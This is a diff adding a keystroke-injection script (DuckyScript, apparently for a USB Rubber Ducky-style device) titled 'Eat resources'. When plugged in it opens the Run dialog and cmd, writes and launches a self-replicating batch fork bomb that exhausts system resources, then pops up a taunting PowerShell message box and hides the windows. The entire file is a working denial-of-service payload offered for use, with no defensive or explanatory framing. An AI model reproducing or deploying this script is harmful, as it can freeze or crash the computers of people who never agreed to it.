@@ -1,0 +1,21 @@
+REM Author: Luke487
+REM Description: Eat resources
+REM Version: 1.0
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING echo %0^|%0 > forkbomb.bat && forkbomb.bat
+ENTER
+DELAY 500
+GUI r
+STRING powershell
+ENTER
+DELAY 500
+STRING PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('ResourceEater3000 has been opened successfully. NOMNOMNOMNOM')"
+ENTER
+DELAY 500
+GUI d
+ALT TAB
